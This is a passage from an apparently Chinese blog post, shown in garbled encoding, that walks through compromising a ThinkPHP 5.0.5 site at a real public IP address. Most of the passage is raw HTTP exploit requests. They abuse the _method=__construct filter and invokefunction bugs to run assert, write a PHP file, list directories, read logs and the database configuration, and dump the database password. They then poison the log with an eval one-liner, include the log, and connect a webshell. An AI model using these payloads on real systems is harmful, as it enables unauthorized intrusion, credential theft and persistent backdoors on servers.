class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 903_method=__construct&amp;filter[]=assert&amp;method=get&amp;get[]=@file_put_contents(base64_decode(MzMzMy5waHA=),base64_decode("YWZhZHNmZHM8P3BocCBwaHBpbmZvKCk7Pz5hZmRzZmRzZg=="));è¿”å›:   &lt;div class="info">                &lt;div>                    &lt;h2>[8] &lt;abbr title="think\exception\ErrorException">ErrorException&lt;/abbr> in &lt;a class="toggle" title="/www/wwwroot/s.ios0.top/thinkphp/library/think/Request.php(1040) : assert code line 1">Request.php(1040) : assert code line 1&lt;/a>&lt;/h2>                &lt;/div>                &lt;div>&lt;h1>Use of undefined constant __construct - assumed '__construct'&lt;/h1>&lt;/div>            &lt;/div>            &lt;/div></span></code></pre><p>æ³¨æ„æœ‰äº›æ ¹ç›®å½•ä¸å¯å†™é€šè¿‡è¿™ç§æ–¹å¼å¯èƒ½æ‹¿ä¸åˆ°shellã€‚æ‰€ä»¥å¯ä»¥å†™åˆ°åˆ«çš„æ–‡ä»¶å¤¹é‡Œé¢ã€‚å¦‚æœé‡åˆ°å¯ä»¥å°è¯•ä¸€ä¸‹ã€‚åç»­æˆ‘é‡åˆ°çš„è¯ä¼šè¡¥å……ä¸€æ³¢å¦‚ä½•å†™åˆ°åˆ«çš„æ–‡ä»¶å¤¹é‡Œé¢ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271420885.png" alt="å†™æ–‡ä»¶ç›´æ¥æ‹¿ä¸‹"><br>å¦å¤–ä»£ç æ‰§è¡Œè¿˜æœ‰ä¸€ç§æ‰“æ³•</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token comment">//index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=@file_put_contents(base64_decode(MzMzMy5waHA=),base64_decode("YWZhZHNmZHM8P3BocCBwaHBpbmZvKCk7Pz5hZmRzZmRzZg==")) HTTP/1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271423551.png" alt="ç›´æ¥æ‹¿ä¸‹"><br>å¯ä»¥çœ‹åˆ°æˆåŠŸæ‹¿ä¸‹webshellã€‚ä¸Šè¿°æ‰“æ³•æ˜¯é’ˆå¯¹å¯ä»¥æ‰§è¡Œä»£ç çš„é‚£ä¹ˆæ— æ³•æ‰§è¡Œä»£ç çš„å¦‚ä½•æ‰“ã€‚å†°èè¿æ¥<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271426322.png" alt="å†°èè¿æ¥"><br>å¯¹äº†ä¸Šè¿°ç›®æ ‡æ˜¯ thinkphpæ¡†æ¶çš„ç‰ˆæœ¬æ˜¯ 5.0.5 ã€‚æˆ‘ä»¬å‡å¦‚è¿™ä¸ªç½‘ç«™ä¸å¯ä»¥æ‰§è¡Œä»£ç æˆ‘ä»¬å¦‚ä½•æ‰“ã€‚</p><h2 id="äºŒ-æ—¥å¿—æ–¹å¼æ‰“"><a href="#äºŒ-æ—¥å¿—æ–¹å¼æ‰“" class="headerlink" title="äºŒ:æ—¥å¿—æ–¹å¼æ‰“"></a>äºŒ:æ—¥å¿—æ–¹å¼æ‰“</h2><p>  å¯¹äºæ—¥å¿—æ–¹å¼æˆ‘ä»¬å…ˆå¾—æ‰¾åˆ°æ—¥å¿—åœ¨å“ªé‡Œå­˜ç€,éå†ç›®å½•å¯»æ‰¾æ—¥å¿—æ—¥å¿—.</p>  <pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 75_method=__construct&amp;filter[]=scandir&amp;&amp;filter[]=var_dump&amp;method=GET&amp;get[]=./</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271434575.png" alt="éå†ç›®å½•æŸ¥æ‰¾æ—¥å¿—æ–‡ä»¶ä½ç½®"><br>æˆ‘ä»¬æ ¼å¼åŒ–ä¸€ä¸‹æŸ¥çœ‹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271437009.png" alt="æ ¼å¼åŒ–æŸ¥çœ‹"><br>ç†Ÿæ‚‰thinkphpæ¡†æ¶çš„éƒ½çŸ¥é“æˆ‘ä»¬çš„æ—¥å¿—æ–‡ä»¶ä¸€èˆ¬åœ¨runtimeç›®å½•ä¸‹é¢æˆ‘ä»¬ä»¥æ­¤éå†æ—¥å¿—ä½ç½®æ˜¯.&#x2F;runtime&#x2F;log&#x2F;202406&#x2F;15.log<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271439294.png" alt="æ—¥å¿—æ–‡ä»¶ä½ç½®"><br>æˆ‘ä»¬çœ‹ä¸€ä¸‹æ—¥å¿—æ–‡ä»¶é‡Œé¢çš„å†…å®¹</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 88_method=__construct&amp;filter[]=highlight_file&amp;method=GET&amp;get[]=./runtime/log/202406/15.log</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271443131.png" alt="æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶å†…å®¹"><br>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥è¯»å–æ•°æ®åº“æ–‡ä»¶</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 87_method=__construct&amp;filter[]=highlight_file&amp;method=GET&amp;get[]=./application/database.php</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271446843.png" alt="æŸ¥çœ‹æ•°æ®åº“æ–‡ä»¶å†…å®¹"><br>å½“ç„¶æˆ‘ä»¬å¯ä»¥ç”¨å¦å¤–ä¸€ç§æ–¹å¼è¯»å–æ•°æ®åº“,æŸ¥çœ‹æ•°æ®å¯†ç </p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>think\config<span class="token operator">/</span>get<span class="token operator">&amp;</span>name<span class="token operator">=</span>database<span class="token punctuation">.</span>password  HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271448665.png" alt="æŸ¥çœ‹æ•°æ®åº“ç”¨æˆ·å"><br>æˆ‘ä»¬å›å½’æ­£é¢˜æ—¢ç„¶æˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†æ—¥å¿—è·¯å¾„æ˜¯ä¸æ˜¯æƒ³èµ·äº†thinkphpåŒ…å«getshellå¯¹å°±æ˜¯ä»–ã€‚æµ‹è¯•æ˜¯å¦æ­£å¸¸åŒ…å«</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 106_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=-1&amp;get[]=./runtime/log/202406/15.log</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271451027.png" alt="æµ‹è¯•æ˜¯å¦æ­£å¸¸åŒ…å«æ–‡ä»¶"><br>æŠ¥é”™è®°å½•æ—¥å¿—</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 79_method=__construct&lt;?php $a=strtoupper('$_post["x"]');eval("eval($a);")?>ssssss</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271454125.png" alt="æŠ¥é”™è®°å½•æ—¥å¿—"><br>æˆ‘ä»¬ä¸‹è½½æ—¥å¿—çœ‹çœ‹æ˜¯å¦è®°å½•ã€‚ä¸‹è½½æŸ¥çœ‹æ—¥å¿—çœ‹çœ‹ã€‚å¦‚æœä¸‹è½½çš„æ—¥å¿—æ²¡æœ‰é‚£ä¹ˆå¤šæŠ¥é”™å‡ æ¬¡ä»–å°±æœ‰äº†<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271456461.png" alt="è®°å½•äº†æˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶"><br>æ¥ä¸‹æ¥æˆ‘ä»¬åŒ…å«ä¸€æ³¢ã€‚</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 94_method=__construct&amp;filter[]=think\__include_file&amp;method=GET&amp;get[]=./runtime/log/202406/15.log</span></code></pre><p>å†™ä¸€å¥è¯</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 517_method=__construct&amp;filter[]=think\__include_file&amp;method=GET&amp;get[]=./runtime/log/202406/15.log&amp;X=phpinfo();</span></code></pre><p>ç”±äºæˆ‘çš„ä¸€å¥exp æ˜¯å…æ€çš„æ‰€ä»¥æˆ‘å°±è¿™é‡Œæ‰“ä¸€æ³¢é©¬èµ›å…‹å§ã€‚æˆ‘ä»¬çœ‹åˆ°æ‰§è¡Œäº†123456789 ã€‚æ‰€ä»¥è¯æ˜å·²ç»æ‰§è¡Œæˆ‘ä»¬å†™ä¸€å¥è¯çš„ä»£ç ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271501432.png" alt="ç›´æ¥å†™ä¸€å¥è¯"><br>runtime log ç›®å½•ä¸‹ç”Ÿæˆä¸€å¥è¯æœ¨é©¬<br><a href="http://103.106.188.58/runtime/log/202406/xxx.php">http://103.106.188.58/runtime/log/202406/xxx.php</a>   